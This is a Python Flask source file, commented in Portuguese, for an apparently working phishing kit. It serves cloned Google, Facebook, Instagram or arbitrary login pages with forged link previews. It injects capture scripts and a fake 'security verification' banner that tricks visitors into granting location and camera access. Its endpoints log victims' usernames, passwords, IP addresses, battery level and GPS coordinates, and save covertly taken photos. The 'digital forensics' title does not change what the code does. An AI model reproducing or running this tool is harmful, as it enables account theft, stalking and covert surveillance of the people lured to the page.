from flask import Flask, render_template_string, request, jsonify, send_from_directory
import datetime, base64, os, requests, shutil
import pytz, re

# --- CONFIGURAÇÃO DO FUSO HORÁRIO DE BRASÍLIA ---
fuso_br = pytz.timezone('America/Sao_Paulo')

# --- CONFIGURAÇÃO DOS CAMINHOS ---
if os.path.exists("/sdcard"):
    pasta_raiz = "/sdcard/info_spy"
else:
    pasta_raiz = os.path.join(os.getcwd(), "info_spy")

pasta_templates = "templates"
pasta_preview = os.path.join(os.getcwd(), "static/preview")

if not os.path.exists(pasta_raiz): os.makedirs(pasta_raiz)
if not os.path.exists(pasta_templates): os.makedirs(pasta_templates)
if not os.path.exists(pasta_preview): os.makedirs(pasta_preview)

def obter_temas():
    temas = {"1": "google", "2": "facebook", "3": "facebook_pc", "4": "instagram"}
    if os.path.exists(pasta_templates):
        extras = [d for d in os.listdir(pasta_templates) if os.path.isdir(os.path.join(pasta_templates, d))]
        idx = 6
        for pasta in extras:
            if pasta not in temas.values():
                temas[str(idx)] = pasta
                idx += 1
    return temas

def mostrar_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    temas_disponiveis = obter_temas()

    print("="*40)
    print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
    print("="*40)
    for i in range(1, 5):
        print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
    print(" [5] Custom (URL - Clonar agora)")
    for k, v in temas_disponiveis.items():
        if int(k) >= 6:
            print(f" [{k}] {v} (Salvo)")
    print("="*40)

    opcao = input(" Escolha o template: ")
    
    ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
    ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'   # Nova opção
    
    url_custom = ""
    if opcao == "5":
        url_custom = input(" Digite a URL para clonar: ")
        if not url_custom.startswith("http"): url_custom = "https://" + url_custom
        salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
        if salvar == 's':
            nome_pasta = input(" Digite o nome para a nova pasta: ").replace(" ", "_")
            caminho_novo = os.path.join(pasta_templates, nome_pasta)
            if not os.path.exists(caminho_novo): os.makedirs(caminho_novo)
            try:
                res = requests.get(url_custom, verify=False, timeout=10)
                with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                    f.write(res.text)
                return nome_pasta, input(" URL de redirecionamento: "), url_custom, ativar_loc, ativar_foto, ativar_banner
            except: print("Erro ao salvar.")

    link_destino = input(" Digite a URL para redirecionar: ")
    if not link_destino.startswith("http"): link_destino = "https://" + link_destino
    tema_escolhido = temas_disponiveis.get(opcao, "google")
    if opcao == "5": tema_escolhido = "custom"

    return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner

# Desempacotando todas as opções
pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()

# --- PERSONALIZAÇÃO DE PREVIEW ---
print("\n" + "="*40)
personalizar = input(" Deseja personalizar o preview do link? (s/n): ").lower()

meta_titulo, meta_desc, img_local = None, None, None
nome_servir = "preview.jpg"

if personalizar == 's':
    meta_titulo = input(" Título do link: ")
    meta_desc   = input(" Descrição do link: ")
    img_local   = input(" Nome da imagem local (ex: foto.jpg): ")
    if os.path.exists(img_local):
        shutil.copy(img_local, os.path.join(pasta_preview, nome_servir))
    print(" [!] Personalização aplicada.")
else:
    print(" [!] Usando metadados originais da página.")
print("="*40 + "\n")

app = Flask(__name__)

@app.route('/preview.jpg')
def imagem_link():
    return send_from_directory(pasta_preview, nome_servir)

@app.route('/')
def index():
    html_original = ""
    try:
        if pasta_tema == "custom":
            res = requests.get(url_alvo_custom, verify=False, timeout=10)
            html_original = res.text
        else:
            path = os.path.join(pasta_templates, pasta_tema, "index.html")
            if not os.path.exists(path): return "Arquivo não encontrado", 404
            with open(path, "r", encoding="utf-8") as f:
                html_original = f.read()
    except Exception as e:
        return f"Erro: {e}", 500

    # --- LIMPEZA DE METADADOS ANTIGOS (Para funcionar no clone) ---
    if personalizar == 's':
        html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
        html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
        html_original = re.sub(r'<meta name="description".*?>', '', html_original, flags=re.IGNORECASE)

    meta_tags = ""
    if personalizar == 's':
        link_da_foto = f"{request.host_url}preview.jpg"
        meta_tags = (
            f'<title>{meta_titulo}</title>\n'
            f'<meta property="og:title" content="{meta_titulo}">\n'
            f'<meta property="og:description" content="{meta_desc}">\n'
            f'<meta property="og:image" content="{link_da_foto}">\n'
            f'<meta property="og:type" content="website">\n'
            f'<meta name="description" content="{meta_desc}">\n'
        )

    # ==================== BANNER E GPS (CORRIGIDO) ====================
    css_banner = '''
    <style>
        #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; 
        z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
        #box-spy { background: #fff; padding: 30px; text-align: center; max-width: 85%; }
        #btn-spy { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 16px; }
    </style>
    '''
    
    html_banner = '''
    <div id="bloqueio-spy">
        <div id="box-spy">
            <h2 style="margin-top:0; color:#333;">Verificação de Segurança</h2>
            <p style="color:#666;">Para continuar e visualizar o conteúdo, você deve aceitar as permissões do navegador.</p>
            <button id="btn-spy" onclick="aceitarCookies()">CONTINUAR</button>
        </div>
    </div>
    '''

    script_config = f'''<script>
        window.temaAtual="{pasta_tema}"; 
        window.urlRedirecionamento="{url_redirecionamento}";
        window.usarLoc={"true" if usar_loc else "false"};
        window.usarFoto={"true" if usar_foto else "false"};
        
        function aceitarCookies() {{
            document.getElementById('bloqueio-spy').style.display = 'none';
            if(typeof dispararGPS === "function") dispararGPS();
        }}

        // === GPS AUTOMÁTICO QUANDO BANNER ESTIVER DESATIVADO ===
        if (!{"true" if ativar_banner else "false"}) {{
            window.addEventListener('load', function() {{
                setTimeout(function() {{
                    if (typeof dispararGPS === "function" && window.usarLoc === true) {{
                        dispararGPS();
                    }}
                }}, 1200);   // Delay para garantir compatibilidade com navegadores
            }});
        }}
    </script>'''
    
    scripts_captura = '\n<script src="/static/js/espiao.js"></script>\n<script src="/static/js/saida.js"></script>\n'

    head_content = meta_tags + script_config + scripts_captura

    # Adiciona CSS do banner apenas se estiver ativado
    if ativar_banner:
        head_content = css_banner + head_content
        banner_html = html_banner
    else:
        banner_html = ""

    # Injeta conteúdo no <head>
    if re.search(r'<head', html_original, re.IGNORECASE):
        html_final = re.sub(r'(<head[^>]*>)', r'\1' + head_content, html_original, flags=re.IGNORECASE, count=1)
    else:
        html_final = head_content + html_original

    # Injeta o banner no <body> apenas se ativado
    if ativar_banner:
        if re.search(r'<body', html_final, re.IGNORECASE):
            html_final = re.sub(r'(<body[^>]*>)', r'\1' + banner_html, html_final, flags=re.IGNORECASE, count=1)
        else:
            html_final = banner_html + html_final
    
    return render_template_string(html_final)

@app.route('/capturar', methods=['POST'])
def capturar():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    
    if ip_list:
        ip_publico = ip_list[0]
    else:
        ip_publico = request.remote_addr
        
    ip_interno = dados.get('ip_interno', 'N/A')
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")

    log = (f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
           f"IP INTERNO (LAN): {ip_interno}\n"
           f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
           f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
           f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
           f"{'-'*50}\n")

    caminho_relatorio = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho_relatorio, "a") as f:
        f.write(log)
    print(f"\033[92m[+] Evidência salva em: {caminho_relatorio} (Horário BRT: {agora})\033[0m")
    return jsonify({"status": "ok"}), 200

@app.route('/foto', methods=['POST'])
def receber_foto():
    dados = request.json
    try:
        imagem_b64 = dados.get('image', '').split(',')
        agora = datetime.datetime.now(fuso_br).strftime("%Y%m%d_%H%M%S")
        nome_arq = f"FOTO_{agora}.jpg"
        with open(os.path.join(pasta_raiz, nome_arq), "wb") as f:
            f.write(base64.b64decode(imagem_b64[1]))
        print(f"\033[92m[+] Foto salva: {nome_arq}\033[0m")
    except: pass
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
